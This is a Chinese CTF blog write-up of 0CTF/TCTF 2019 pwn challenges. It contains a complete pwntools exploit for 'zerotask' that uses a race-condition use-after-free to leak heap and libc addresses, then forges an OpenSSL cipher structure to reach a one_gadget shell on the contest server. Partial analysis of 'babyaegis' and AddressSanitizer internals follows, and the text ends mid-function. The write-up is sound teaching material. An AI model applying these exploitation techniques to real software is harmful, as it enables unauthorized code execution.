<!DOCTYPE html>
<html lang="zh-CN">





<head><meta name="generator" content="Hexo 3.8.0">
  <meta charset="UTF-8">
  <link rel="apple-touch-icon" sizes="76x76" href="/img/apple-touch-icon.png">
  <link rel="icon" type="image/png" href="/img/favicon.png">
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, shrink-to-fit=no">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  
  <meta name="description" content="zs0zrc&#39;s blog">
  <meta name="author" content="zs0zrc">
  <meta name="keywords" content="pwn CTF security anythings">
  <title>0CTF/TCTF2019 PWN 复现 - zs0zrc</title>

  <link rel="stylesheet" href="https://cdn.staticfile.org/font-awesome/5.12.1/css/all.min.css">
<link rel="stylesheet" href="https://cdn.staticfile.org/twitter-bootstrap/4.4.1/css/bootstrap.min.css">
<link rel="stylesheet" href="https://cdn.staticfile.org/mdbootstrap/4.13.0/css/mdb.min.css">
<link rel="stylesheet" href="https://cdn.staticfile.org/github-markdown-css/3.0.1/github-markdown.min.css">
<link rel="stylesheet" href="//at.alicdn.com/t/font_1067060_qzomjdt8bmp.css">


  <link rel="stylesheet" href="/lib/prettify/tomorrow-night-eighties.min.css">

<link rel="stylesheet" href="/css/main.css">


  <link rel="stylesheet" href="https://cdn.staticfile.org/fancybox/3.5.7/jquery.fancybox.min.css">


<!-- 自定义样式保持在最底部 -->


</head>


<body>
  <header style="height: 70vh;">
    <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
  <div class="container">
    <a class="navbar-brand" href="/">&nbsp;<strong>zs0zrc</strong>&nbsp;</a>

    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse" data-target="#navbarSupportedContent" aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
      <div class="animated-icon"><span></span><span></span><span></span></div>
    </button>

    <!-- Collapsible content -->
    <div class="collapse navbar-collapse" id="navbarSupportedContent">
      <ul class="navbar-nav ml-auto text-center">
        
          
          
          
          
          <li class="nav-item">
            <a class="nav-link" href="/">首页</a>
          </li>
        
          
          
          
          
          <li class="nav-item">
            <a class="nav-link" href="/archives/">归档</a>
          </li>
        
          
          
          
          
          <li class="nav-item">
            <a class="nav-link" href="/categories/">分类</a>
          </li>
        
          
          
          
          
          <li class="nav-item">
            <a class="nav-link" href="/tags/">标签</a>
          </li>
        
          
          
          
          
          <li class="nav-item">
            <a class="nav-link" href="/about/">关于</a>
          </li>
        
          
          
          
          
          <li class="nav-item">
            <a class="nav-link" href="/links/">友链</a>
          </li>
        
        
          <li class="nav-item" id="search-btn">
            <a class="nav-link" data-toggle="modal" data-target="#modalSearch">&nbsp;&nbsp;<i class="iconfont icon-search"></i>&nbsp;&nbsp;</a>
          </li>
        
      </ul>
    </div>
  </div>
</nav>

    <div class="view intro-2" id="background" parallax=true
         style="background: url('/img/image1.png') no-repeat center center;
           background-size: cover;">
      <div class="full-bg-img">
        <div class="mask rgba-black-light flex-center">
          <div class="container text-center white-text fadeInUp">
            <span class="h2" id="subtitle">
              
            </span>

            
              
                <p class="mt-3 post-meta">
                  <i class="fas fa-calendar-alt" aria-hidden="true"></i>
                  星期二, 三月 26日 2019, 11:10 上午
                </p>
              

              <p class="mt-1">
                
                  
                  <span class="post-meta">
                    <i class="far fa-chart-bar"></i>
                    6k 字
                  </span>
                

                
                  
                  <span class="post-meta">
                      <i class="far fa-clock"></i>
                      32 分钟
                  </span>
                

                
                  <!-- 不蒜子统计文章PV -->
                  
                  <span id="busuanzi_container_page_pv" class="post-meta" style="display: none">
                    <i class="far fa-eye" aria-hidden="true"></i>
                    <span id="busuanzi_value_page_pv"></span> 次
                  </span>
                
              </p>
            
          </div>

          
        </div>
      </div>
    </div>
  </header>

  <main>
    
      

<div class="container-fluid">
  <div class="row">
    <div class="d-none d-lg-block col-lg-2"></div>
    <div class="col-lg-8 nopadding-md">
      <div class="container nopadding-md" id="board-ctn">
        <div class="py-5 z-depth-3" id="board">
          <div class="post-content mx-auto" id="post">
            
              <p class="note note-warning">本文最后更新于：星期一, 四月 1日 2019, 7:05 晚上</p>
            
            <div class="markdown-body">
              <p>很棒，不愧是腾讯搞的比赛，题目质量很高。然而自闭pwn手做自闭了，一个人看真的很容易看自闭。但是每次看到自闭了说不看了，结果过了会又回去看了，真香。这里赛后复现下pwn题。</p>
<h3 id="zerotask"><a href="#zerotask" class="headerlink" title="zerotask"></a>zerotask</h3><p>防护机制：</p>
<pre><code>☁  zerotask [master] ⚡  checksec task 
[*] &#39;/home/zs0zrc/game/TCTF2019/pwn/zerotask_pwn/zerotask/task&#39;
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
</code></pre><p>题目一共给了三个文件，一个执行文件，两个动态链接库。</p>
<p>程序一共有三个功能，add_task添加任务，delete_task删除任务，go执行任务</p>
<p><strong>add_task</strong></p>
<pre><code class="c">task *add_task()
{
  task *result; // rax
  int choice; // [rsp+0h] [rbp-10h]
  int id; // [rsp+4h] [rbp-Ch]
  task *s; // [rsp+8h] [rbp-8h]

  printf(&quot;Task id : &quot;, 0LL);
  id = read_int();
  printf(&quot;Encrypt(1) / Decrypt(2): &quot;);
  choice = read_int();
  if ( choice != 1 &amp;&amp; choice != 2 )
    return 0xFFFFFFFFLL;
  s = malloc(0x70uLL);
  memset(s, 0, 0x70uLL);
  if ( !sub_11A8(choice, s) )
    return 0xFFFFFFFFLL;
  s-&gt;id = id;
  s-&gt;next = task_ptr;
  result = s;
  task_ptr = s;
  return result;
}

signed __int64 __fastcall sub_11A8(int choice, task *buf)
{
  __int64 v3; // rsi
  __int64 v5; // [rsp+14h] [rbp-1Ch]

  printf(&quot;Key : &quot;, buf);
  sub_F82(&amp;buf-&gt;type + 4, 32);
  printf(&quot;IV : &quot;, 32LL);
  sub_F82(&amp;buf-&gt;KEY[28], 16);
  printf(&quot;Data Size : &quot;, 16LL);
  v5 = read_int();
  if ( v5 &lt;= 0 || v5 &gt; 4096 )
    return 0LL;
  buf-&gt;size = v5;
  buf-&gt;ctx = EVP_CIPHER_CTX_new();
  if ( choice == 1 )
  {
    v3 = EVP_aes_256_cbc();
    EVP_EncryptInit_ex(buf-&gt;ctx, v3, 0LL, &amp;buf-&gt;type + 4, &amp;buf-&gt;KEY[28]);
  }
  else
  {
    if ( choice != 2 )
      return 0LL;
    v3 = EVP_aes_256_cbc();
    EVP_DecryptInit_ex(buf-&gt;ctx, v3, 0LL, &amp;buf-&gt;type + 4, &amp;buf-&gt;KEY[28]);
  }
  LODWORD(buf-&gt;type) = choice;
  buf-&gt;data = malloc(buf-&gt;size);
  if ( !buf-&gt;data )
    exit(1);
  printf(&quot;Data : &quot;, v3);
  sub_F82(buf-&gt;data, buf-&gt;size);
  return 1LL;
}
</code></pre>
<p>主要功能是创建task，可以控制分配的明文空间的大小。这里有点坑的是 ida反编译的代码有点问题，就是  id和next字段的偏移会显示错误，看汇编可以看到next是在0x68的位置，但反编译的代码显示在0xd处……同时 sub_11A8函数的参数也会识别错误，需要自己修改下，我上面的是修改后的。</p>
<p>task结构体：(简陋的逆向了一个结构体)</p>
<pre><code>00000000 task            struc ; (sizeof=0x70, mappedto_6)
00000000 data            dq ?                    ; offset
00000008 size            dq ?
00000010 type            dq ?
00000018 KEY             db 32 dup(?)
00000038 IV              db 16 dup(?)
00000048 padding         db 16 dup(?)
00000058 ctx             dq ?                    ; offset
00000060 id              dd ?
00000064 field_64        dd ?
00000068 next            dq ?                    ; offset
00000070 task            ends
</code></pre><p><strong>delete</strong></p>
<pre><code class="c">void delete()
{
  int idx; // [rsp+Ch] [rbp-14h]
  task *ptr; // [rsp+10h] [rbp-10h]
  task *v2; // [rsp+18h] [rbp-8h]

  ptr = task_ptr;
  v2 = task_ptr;
  printf(&quot;Task id : &quot;);
  idx = read_int();
  if ( task_ptr &amp;&amp; idx == *(task_ptr + 0x60) )
  {
    task_ptr = *(task_ptr + 0x68);
    EVP_CIPHER_CTX_free(ptr-&gt;ctx);
    free(ptr-&gt;data);
    free(ptr);
  }
  else
  {
    while ( ptr )
    {
      if ( idx == ptr-&gt;id )
      {
        v2-&gt;next = ptr-&gt;next;
        EVP_CIPHER_CTX_free(ptr-&gt;ctx);
        free(ptr-&gt;data);
        free(ptr);
        return;
      }
      v2 = ptr;
      ptr = ptr-&gt;next;
    }
  }
}
</code></pre>
<p>将task的chunk释放掉，同时释放 ctx结构体以及申请的data空间。</p>
<p><strong>go</strong></p>
<pre><code class="c">unsigned __int64 encrypt()
{
  int v1; // [rsp+4h] [rbp-1Ch]
  pthread_t newthread; // [rsp+8h] [rbp-18h]
  task *arg; // [rsp+10h] [rbp-10h]
  unsigned __int64 v4; // [rsp+18h] [rbp-8h]

  v4 = __readfsqword(0x28u);
  printf(&quot;Task id : &quot;);
  v1 = read_int();
  for ( arg = task_ptr; arg; arg = arg-&gt;next )
  {
    if ( v1 == arg-&gt;id )
    {
      pthread_create(&amp;newthread, 0LL, start_routine, arg);
      return __readfsqword(0x28u) ^ v4;
    }
  }
  return __readfsqword(0x28u) ^ v4;
}

void __fastcall __noreturn start_routine(task *buf)
{
  int v1; // [rsp+14h] [rbp-2Ch]
  __int128 v2; // [rsp+18h] [rbp-28h]
  __int64 v3; // [rsp+28h] [rbp-18h]
  __int64 v4; // [rsp+30h] [rbp-10h]
  unsigned __int64 v5; // [rsp+38h] [rbp-8h]

  v5 = __readfsqword(0x28u);
  v2 = buf;
  v1 = 0;
  v3 = 0LL;
  v4 = 0LL;
  puts(&quot;Prepare...&quot;);
  sleep(2u);
  memset(ciphertext, 0, 0x1010uLL);
  if ( !EVP_CipherUpdate(*(v2 + 0x58), ciphertext, &amp;v1, *v2, *(v2 + 8)) )
    pthread_exit(0LL);
  *(&amp;v2 + 1) += v1;
  if ( !EVP_CipherFinal_ex(*(v2 + 88), ciphertext + *(&amp;v2 + 1), &amp;v1) )
    pthread_exit(0LL);
  *(&amp;v2 + 1) += v1;
  puts(&quot;Ciphertext: &quot;);
  sub_107B(stdout, ciphertext, *(&amp;v2 + 1), 0x10uLL, 1uLL);
  pthread_exit(0LL);
}
</code></pre>
<p>go功能开启一个线程，根据输入的task_id，执行加密或者解密操作，然后将结果输出。漏洞也出现在这里，因为它开启线程后还sleep(2u)， 很明显的一个条件竞争漏洞…….我当时竟然看不出来，通过这个漏洞可以造成UAF 。</p>
<p>例如：</p>
<pre><code class="python">go(1)
delete(1)
</code></pre>
<p>通过UAF就可以泄露出heap和libc的地址了，不过因为它delete时会将ctx结构体也free掉，如果要泄露的话，delete后要重新创建一个task，不然会报错。</p>
<p>如下：</p>
<pre><code class="python">go(1)
delete(1)
add_task(1)
#通过这个就可以泄露地址了
</code></pre>
<p>泄露heap地址:</p>
<pre><code class="python">def leak_heap():
    add_task(1,2,0x90,&#39;d&#39;*0x90)
    add_task(10,1,0x90,&#39;c&#39;*0x90)
    add_task(11,1,0x90,&#39;c&#39;*0x90)
    delete(1)
    go(10)
    delete(10)
    add_task(10,1,0x90,&#39;&#39;)

    p.recvuntil(&#39;text: \n&#39;)
    data = p.recvline(&#39;\n&#39;)
    data = data.replace(&quot; &quot;,&#39;&#39;).strip()

    plain = mc.decrypt(data)
    heap_addr=u64(plain[:8])
    heap_base = heap_addr - 0x14c0
    p.send(&#39;a&#39;*0x90)
    print hex(heap_base)
    return heap_base
</code></pre>
<p>泄露libc地址：</p>
<pre><code class="python">def leak_libc():
    add_task(20,1,0x410,&#39;c&#39;*0x410)#因为它是ubuntu18，由tcache,所以分配一个大小超出tcache范围的chunk来泄露libc地址
    add_task(5,1,0x20,&#39;c&#39;*0x20)
    go(20)
    delete(20)
    add_task(20,1,0x410,&#39;&#39;)
    p.recvuntil(&#39;text: \n&#39;)
    data = p.recvuntil(&#39;\n&#39;)
    data = data.replace(&quot; &quot;,&#39;&#39;).strip()

    plain = mc.decrypt(data)
    leak_libc =u64(plain[:8]) - 0x3ebca0
    libc_base = leak_libc
    libc.address = libc_base
    p.send(&#39;a&#39;*0x410)
    print hex(libc_base)
    return libc_base
</code></pre>
<p>地址都泄露出来后，就要考虑怎么控制程序的执行流。这里因为是条件竞争造成的UAF，不能通过这个来构造overlapping chunk。这里通过UAF来劫持EVP_CIPHER_CTX结构体，通过伪造EVP_CIPHER_CTX结构体来劫持程序流。</p>
<p>EVP_CipherUpdate源码：</p>
<pre><code class="c">int EVP_CipherUpdate(EVP_CIPHER_CTX *ctx, unsigned char *out, int *outl,
                     const unsigned char *in, int inl)
{
    if (ctx-&gt;encrypt)
        return EVP_EncryptUpdate(ctx, out, outl, in, inl);
    else
        return EVP_DecryptUpdate(ctx, out, outl, in, inl);
}

int EVP_EncryptUpdate(EVP_CIPHER_CTX *ctx, unsigned char *out, int *outl,
                      const unsigned char *in, int inl)
{
    /* Prevent accidental use of decryption context when encrypting */
    if (!ctx-&gt;encrypt) {
        EVPerr(EVP_F_EVP_ENCRYPTUPDATE, EVP_R_INVALID_OPERATION);
        return 0;
    }

    return evp_EncryptDecryptUpdate(ctx, out, outl, in, inl);
}

static int evp_EncryptDecryptUpdate(EVP_CIPHER_CTX *ctx,
                                    unsigned char *out, int *outl,
                                    const unsigned char *in, int inl)
{
    int i, j, bl;

    if (ctx-&gt;cipher-&gt;flags &amp; EVP_CIPH_FLAG_CUSTOM_CIPHER) {
        i = M_do_cipher(ctx, out, in, inl);        //要劫持的目标
        if (i &lt; 0)
            return 0;
        else
            *outl = i;
        return 1;
    }

    if (inl &lt;= 0) {
        *outl = 0;
        return inl == 0;
    }

    if (ctx-&gt;buf_len == 0 &amp;&amp; (inl &amp; (ctx-&gt;block_mask)) == 0) {
        if (M_do_cipher(ctx, out, in, inl)) {
            *outl = inl;
            return 1;
        } else {
            *outl = 0;
            return 0;
        }
    }
    i = ctx-&gt;buf_len;
    bl = ctx-&gt;cipher-&gt;block_size;
    OPENSSL_assert(bl &lt;= (int)sizeof(ctx-&gt;buf));
    if (i != 0) {
        if (bl - i &gt; inl) {
            memcpy(&amp;(ctx-&gt;buf[i]), in, inl);
            ctx-&gt;buf_len += inl;
            *outl = 0;
            return 1;
        } else {
            j = bl - i;
            memcpy(&amp;(ctx-&gt;buf[i]), in, j);
            if (!M_do_cipher(ctx, out, ctx-&gt;buf, bl))
                return 0;
            inl -= j;
            in += j;
            out += bl;
            *outl = bl;
        }
    } else
        *outl = 0;
    i = inl &amp; (bl - 1);
    inl -= i;
    if (inl &gt; 0) {
        if (!M_do_cipher(ctx, out, in, inl))
            return 0;
        *outl += inl;
    }

    if (i != 0)
        memcpy(ctx-&gt;buf, &amp;(in[inl]), i);
    ctx-&gt;buf_len = i;
    return 1;
}
</code></pre>
<p>EVP_CIPHER_CTX结构体：</p>
<pre><code class="c">struct evp_cipher_ctx_st {
    const EVP_CIPHER *cipher;
    ENGINE *engine;             /* functional reference if &#39;cipher&#39; is
                                 * ENGINE-provided */
    int encrypt;                /* encrypt or decrypt */
    int buf_len;                /* number we have left */
    unsigned char oiv[EVP_MAX_IV_LENGTH]; /* original iv */
    unsigned char iv[EVP_MAX_IV_LENGTH]; /* working iv */
    unsigned char buf[EVP_MAX_BLOCK_LENGTH]; /* saved partial block */
    int num;                    /* used by cfb/ofb/ctr mode */
    void *app_data;             /* application stuff */
    int key_len;                /* May change for variable length cipher */
    unsigned long flags;        /* Various flags */
    void *cipher_data;          /* per EVP data */
    int final_used;
    int block_mask;
    unsigned char final[EVP_MAX_BLOCK_LENGTH]; /* possible final block */
} /* EVP_CIPHER_CTX */ ;
</code></pre>
<p>EVP_CIPHER结构体：</p>
<pre><code class="c">struct evp_cipher_st {
    int nid;
    int block_size;
    /* Default value for variable length ciphers */
    int key_len;
    int iv_len;
    /* Various flags */
    unsigned long flags;
    /* init key */
    int (*init) (EVP_CIPHER_CTX *ctx, const unsigned char *key,
                 const unsigned char *iv, int enc);
    /* encrypt/decrypt data */
    int (*do_cipher) (EVP_CIPHER_CTX *ctx, unsigned char *out,
                      const unsigned char *in, size_t inl);
    /* cleanup ctx */
    int (*cleanup) (EVP_CIPHER_CTX *);
    /* how big ctx-&gt;cipher_data needs to be */
    int ctx_size;
    /* Populate a ASN1_TYPE with parameters */
    int (*set_asn1_parameters) (EVP_CIPHER_CTX *, ASN1_TYPE *);
    /* Get parameters from a ASN1_TYPE */
    int (*get_asn1_parameters) (EVP_CIPHER_CTX *, ASN1_TYPE *);
    /* Miscellaneous operations */
    int (*ctrl) (EVP_CIPHER_CTX *, int type, int arg, void *ptr);
    /* Application data */
    void *app_data;
} /* EVP_CIPHER */ ;
</code></pre>
<p>通过查看源码可以发现一条调用链：</p>
<blockquote>
<p>EVP_CipherUpdate -&gt;EVP_EncryptUpdate-&gt;M_do_cipher</p>
</blockquote>
<p>而 M_do_cipher实际上是对cipher+0x20处的函数指针的调用。所以具体利用思路是在堆中写入伪造的fake_cipher 结构体，fake_cipher结构体偏移0x20处填入one_gadget，前面的仿照之前的cipher就可以了。然后利用UAF, 劫持ctx结构体，使其 cipher字段指向伪造的fake_cipher结构体，最后getshell。</p>
<p>其实通过调试也可以发现EVP_CipherUpdate函数中存在一处相对调用，这里call [rax+0x20] ，rax是ctx结构体的cipher结构体的地址，而[rax+0x20] 则是 cipher中的 do_cipher函数指针。</p>
<p><img src="/picture/1553949142123.png" srcset="/img/loading.gif" alt="1553949142123"></p>
<p>exp:</p>
<pre><code class="python">from pwn import*
from Crypto.Cipher import AES
from binascii import b2a_hex, a2b_hex

context.log_level = &quot;debug&quot;

#p = process(&#39;./task&#39;)
p = remote(&quot;111.186.63.201&quot;,10001)
libc = ELF(&#39;/lib/x86_64-linux-gnu/libc.so.6&#39;)

class Myencrypt():
    def __init__(self,Key,IV):
        self.Key = Key
        self.IV = IV
        self.mode = AES.MODE_CBC

    def encrypt(self,data):
        cipher = AES.new(self.Key,self.mode,self.IV)
        length = 32
        len_d = len(data)
        align = 0
        if len_d%length !=0:
            align = length - len_d%length
        else:
            align = 0
        data = data + align*&#39;\0&#39;
        self.enc = cipher.encrypt(data) 
        return b2a_hex(self.enc)       

    def decrypt(self,data):
        cipher = AES.new(self.Key,self.mode,self.IV) 
        plain = cipher.decrypt(a2b_hex(data))
        return plain.strip(&#39;\0&#39;)


def add_task(idx,cmd,size,data=&#39;&#39;):
    p.sendlineafter(&quot;:&quot;,&quot;1&quot;)
    p.sendlineafter(&quot;:&quot;,str(idx))
    p.sendlineafter(&quot;:&quot;,str(cmd))
    p.sendafter(&quot;:&quot;,&#39;a&#39;*0x20)
    p.sendafter(&quot;:&quot;,&#39;b&#39;*0x10)
    p.sendlineafter(&quot;:&quot; , str(size))
    p.sendafter(&quot;:&quot;, data)

def delete(idx):
    p.sendlineafter(&quot;Choice: &quot;,&quot;2&quot;)
    p.sendlineafter(&quot;:&quot;,str(idx))

def go(idx):
    p.sendlineafter(&quot;Choice: &quot;,&quot;3&quot;)   
    p.sendlineafter(&quot;:&quot;,str(idx))     

def leak_heap():
    global heap_base 
    add_task(1,2,0x8,&#39;d&#39;*0x8)
    add_task(2,1,0x8,&#39;c&#39;*0x8)
    add_task(3,1,0x8,&#39;c&#39;*0x8)
    delete(1)
    go(2)
    delete(2)
    add_task(2,1,0x8,&#39;&#39;)

    p.recvuntil(&#39;text: \n&#39;)
    data = p.recvline(&#39;\n&#39;)
    data = data.replace(&quot; &quot;,&#39;&#39;).strip()

    plain = mc.decrypt(data)
    heap_addr=u64(plain[:8])
    heap_base = heap_addr - 0x14c0
    p.send(&#39;a&#39;*0x8)
    print hex(heap_base)
    return heap_base


def leak_libc():
    add_task(20,1,0x410,&#39;c&#39;*0x410)
    add_task(5,1,0x20,&#39;c&#39;*0x20)
    go(20)
    delete(20)
    add_task(20,1,0x410,&#39;&#39;)
    p.recvuntil(&#39;text: \n&#39;)
    data = p.recvuntil(&#39;\n&#39;)
    data = data.replace(&quot; &quot;,&#39;&#39;).strip()

    plain = mc.decrypt(data)
    leak_libc =u64(plain[:8]) - 0x3ebca0
    libc_base = leak_libc
    libc.address = libc_base
    p.send(&#39;a&#39;*0x410)
    print hex(libc_base)
    return libc_base

def get_shell():
    one_gadget = 0x10a38c + libc.address
    success(hex(one_gadget))
    fake_cipher =  p64(0x10000001ab) + p64(0x1002) + p64(1) + p64(0) + p64(one_gadget)
    add_task(0x20,1,0x28,fake_cipher)

    add_task(11,1,0x20,&#39;a&#39;*0x20)
    add_task(12,1,0x70,&#39;a&#39;*0x70)
    add_task(13,1,0x20,&#39;a&#39;*0x20)

    go(12)
    delete(12)
    delete(11)
    add_task(11,1,0xa8,p64(heap_base + 0x24b0).ljust(0xa8,&#39;\x00&#39;)) # control task_12 -&gt; ctx
    sleep(1)
    p.interactive(&quot;zs0zrc&gt;&gt;&quot;)


#gdb.attach(p,&quot;b EVP_CipherUpdate&quot;)

heap_base = 0

mc = Myencrypt(&#39;a&#39;*0x20,&#39;b&#39;*0x10)#AES object
leak_heap()
leak_libc()
get_shell()

</code></pre>
<p><img src="/picture/1553956567752.png" srcset="/img/loading.gif" alt="1553956567752"></p>
<h3 id="babyaegis"><a href="#babyaegis" class="headerlink" title="babyaegis"></a>babyaegis</h3><p>我看的第一道题就是这道，被7个防护机制惊呆了…….是我孤陋寡闻了。</p>
<h4 id="防护机制："><a href="#防护机制：" class="headerlink" title="防护机制："></a>防护机制：</h4><pre><code>☁  aegis [master] ⚡  checksec aegis 
[*] &#39;/home/zs0zrc/game/TCTF2019/pwn/babyaegis_pwn/aegis/aegis&#39;
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
    FORTIFY:  Enabled
    ASAN:     Enabled
    UBSAN:    Enabled
</code></pre><h4 id="AddressSanitizer的前置知识"><a href="#AddressSanitizer的前置知识" class="headerlink" title="AddressSanitizer的前置知识"></a>AddressSanitizer的前置知识</h4><p>其中我没见过的是ASAN和 UBSAN。</p>
<p>ASAN是指<code>AddressSanitizer</code> ，这是一款用于检测C/C++内存错误的工具。而UBSAN是指<code>UndefinedBehaviorSanitizer</code> , 这是一款用于检测未定义行为的检测器，比如使用没对齐的或者为空的指针什么的。</p>
<p><code>AddressSanitizer</code>的基本功能：</p>
<pre><code>检测以下行为
Use after free (dangling pointer dereference)
Heap buffer overflow
Stack buffer overflow
Global buffer overflow
Use after return
Use after scope
Initialization order bugs
Memory leaks
</code></pre><p>AddressSanitizer的基本原理：<a href="https://blog.csdn.net/pang241/article/details/76137969" target="_blank" rel="noopener">文章链接</a></p>
<p>AddressSanitizer的官方文档：<a href="https://github.com/google/sanitizers/wiki/AddressSanitizer" target="_blank" rel="noopener">链接</a></p>
<p>AddressSanitizer会对程序中每8个字节内存映射到 shadow memory中对应的一个字节，对内存的读写操作都会对shadow memory对应的内存进行读取，判断内存读写操作是否合法。它检测bufferoverflower的算法思想也比较简单，通过在buffer两边分配Redzone，并且加上锁，如果这两块区域被访问了就说明overflower了。</p>
<p>shadow memory映射规则</p>
<blockquote>
<p>shadow = (Mem&gt;&gt;3) + 0x7fff8000;</p>
</blockquote>
<p>对于栈上的变量，会在它原来分配的内存两边分配额外的Redzone，并且将这两边区域内存加锁，不允许访问，如果被访问了就说明overflow了。</p>
<p>AddressSanitizer会hoo 住malloc和 free函数，使用它自己定义的分配函数。并且它分配的chunk头部0x10个字节是一些描述chunk状态的字段。不同size分配的内存区域不同， 0x10大小的内存分布都是从0x602000000010开始的，并且 free掉后的内存正常情况下是不会被再次分配的。</p>
<p><code>Chunkheader</code>结构体</p>
<pre><code class="c">struct ChunkHeader {
  // 1-st 8 bytes.
  u32 chunk_state       : 8;  // Must be first.
  u32 alloc_tid         : 24;

  u32 free_tid          : 24;
  u32 from_memalign     : 1;
  u32 alloc_type        : 2;
  u32 rz_log            : 3;
  u32 lsan_tag          : 2;
  // 2-nd 8 bytes
  // This field is used for small sizes. For large sizes it is equal to
  // SizeClassMap::kMaxSize and the actual size is stored in the
  // SecondaryAllocator&#39;s metadata.
  u32 user_requested_size : 29;
  // align &lt; 8 -&gt; 0
  // else      -&gt; log2(min(align, 512)) - 2
  u32 user_requested_alignment_log : 3;
  u32 alloc_context_id;
};
</code></pre>
<h4 id="基本功能分析："><a href="#基本功能分析：" class="headerlink" title="基本功能分析："></a>基本功能分析：</h4><p>程序一共有五个功能</p>
<blockquote>
<ol>
<li>add note</li>
<li>show note</li>
<li>update note</li>
<li>delete note</li>
<li>secret</li>
</ol>
</blockquote>
<p>很明显是个菜单题，下面逐个分析函数</p>
<h5 id="add-note"><a href="#add-note" class="headerlink" title="add note"></a>add note</h5><pre><code class="c">unsigned __int64 __usercall add_note@&lt;rax&gt;(unsigned __int64 a1@&lt;rdi&gt;, __int64 a2@&lt;rsi&gt;, __sanitizer::ScopedErrorReportLock *a3@&lt;r12&gt;)
{
  unsigned __int64 v3; // rdi
  __int64 v4; // rdx
  __int64 v5; // rcx
  __int64 v6; // r8
  unsigned __int64 v7; // r9
  int v8; // ST18_4
  unsigned __int64 id; // rax
  unsigned __int64 v10; // rdi
  __int64 v11; // rax
  unsigned __int64 v12; // rdi
  unsigned __int64 v13; // rcx
  __int64 v14; // rcx
  unsigned __int64 v15; // rdi
  __int64 *v16; // rax
  unsigned __int64 v17; // rdi
  unsigned __int64 v18; // rdi
  __int64 buf; // [rsp+8h] [rbp-28h]
  signed int size; // [rsp+1Ch] [rbp-14h]
  signed int idx; // [rsp+20h] [rbp-10h]
  signed int i; // [rsp+24h] [rbp-Ch]

  idx = -1;
  for ( i = 0; i &lt; 10; ++i )
  {
    v3 = &amp;notes + 8 * i;
    if ( *((v3 &gt;&gt; 3) + 0x7FFF8000) )
      _asan_report_load8(v3, a3);
    if ( !*v3 )
    {
      idx = i;
      break;
    }
  }
  if ( idx == -1 )
    error();
  printf(&quot;Size: &quot;);
  size = read_int(&quot;Size: &quot;, a2, v4, v5, v6, v7);
  if ( size &lt; 0x10 || size &gt; 0x400 )
    error();
  buf = malloc(size);
  if ( !buf )
    error();
  printf(&quot;Content: &quot;);
  v8 = read_until_nl_or_max(buf, size - 8);
  printf(&quot;ID: &quot;);
  id = read_ul();
  v10 = v8 + buf;
  if ( *((v10 &gt;&gt; 3) + 0x7FFF8000) )
    id = _asan_report_store8(v10);
  *v10 = id;
  v11 = malloc(&amp;word_10);
  v12 = &amp;notes + 8 * idx;
  if ( *((v12 &gt;&gt; 3) + 0x7FFF8000) )
    v11 = _asan_report_store8(v12);
  *v12 = v11;
  v13 = &amp;notes + 8 * idx;
  if ( *((v13 &gt;&gt; 3) + 0x7FFF8000) )
    _asan_report_load8(&amp;notes + 8 * idx, a3);
  if ( !*v13 )
    error();
  v14 = buf;
  v15 = &amp;notes + 8 * idx;
  if ( *((v15 &gt;&gt; 3) + 0x7FFF8000) )
    _asan_report_load8(v15, a3);
  v16 = *v15;
  if ( *((*v15 &gt;&gt; 3) + 0x7FFF8000LL) )
    v16 = _asan_report_store8(v16);
  *v16 = v14;
  v17 = &amp;notes + 8 * idx;
  if ( *((v17 &gt;&gt; 3) + 0x7FFF8000) )
    _asan_report_load8(v17, a3);
  v18 = *v17 + 8LL;
  if ( *((v18 &gt;&gt; 3) + 0x7FFF8000) )
    _asan_report_store8(v18);
  *v18 = cfi_check;
  puts(&quot;Add success!&quot;);
  return __readfsqword(0x28u);
}
</code></pre>
<p><code>add note</code>函数可以分配大小在0x10-0x400之间的note，最多分配10个note。</p>
<p>它的结构体：</p>
<pre><code>struct note{
    char *buf;
    void *func;
};
</code></pre><p>分配一个0x10大小的note，观察它在内存中的情况。它包含两个指针，一个指向字符串的chunk，另一个指向<code>ctf_check</code>函数</p>
<pre><code class="\">pwndbg&gt; x/10gx 0x557efd17ecc0
0x557efd17ecc0 &lt;notes&gt;:    0x0000602000000030    0x0000000000000000
0x557efd17ecd0 &lt;notes+16&gt;:    0x0000000000000000    0x0000000000000000
0x557efd17ece0 &lt;notes+32&gt;:    0x0000000000000000    0x0000000000000000
0x557efd17ecf0 &lt;notes+48&gt;:    0x0000000000000000    0x0000000000000000
0x557efd17ed00 &lt;notes+64&gt;:    0x0000000000000000    0x0000000000000000
pwndbg&gt; x/10gx 0x0000602000000000
0x602000000000:    0x02ffffff00000002    0x1480000120000010
0x602000000010:    0xef61616161616161    0xbe0123456789abcd
0x602000000020:    0x02ffffff00000002    0x3b00000120000010
0x602000000030:    0x0000602000000010    0x0000557efc2e2ab0
0x602000000040:    0x0000000000000000    0x0000000000000000
pwndbg&gt; x/10gx 0x0000557efc2e2ab0
0x557efc2e2ab0 &lt;cfi_check&gt;:    0xccccccfffff25be9    0x0000000000841f0f
0x557efc2e2ac0 &lt;__libc_csu_init&gt;:    0x41d7894956415741    0x2b1e258d4c544155
0x557efc2e2ad0 &lt;__libc_csu_init+16&gt;:    0x2b362d8d48550023    0x8949fd8941530023
0x557efc2e2ae0 &lt;__libc_csu_init+32&gt;:    0x08ec8348e5294cf6    0xf06a0fe803fdc148
0x557efc2e2af0 &lt;__libc_csu_init+48&gt;:    0xdb312074ed8548ff    0x0000000000841f0f
</code></pre>
<h5 id="show-note"><a href="#show-note" class="headerlink" title="show note"></a>show note</h5><pre><code class="c">unsigned __int64 __usercall show_note@&lt;rax&gt;(__int64 a1@&lt;rdi&gt;, __int64 a2@&lt;rsi&gt;, __sanitizer::ScopedErrorReportLock *a3@&lt;r12&gt;)
{
  __int64 v3; // rdx
  __int64 v4; // rcx
  __int64 v5; // r8
  unsigned __int64 v6; // r9
  unsigned __int64 v7; // rdi
  unsigned __int64 v8; // rdi
  __int64 v9; // r14
  __int64 v10; // rbx
  unsigned __int64 v11; // rbx
  __int64 v12; // rdx
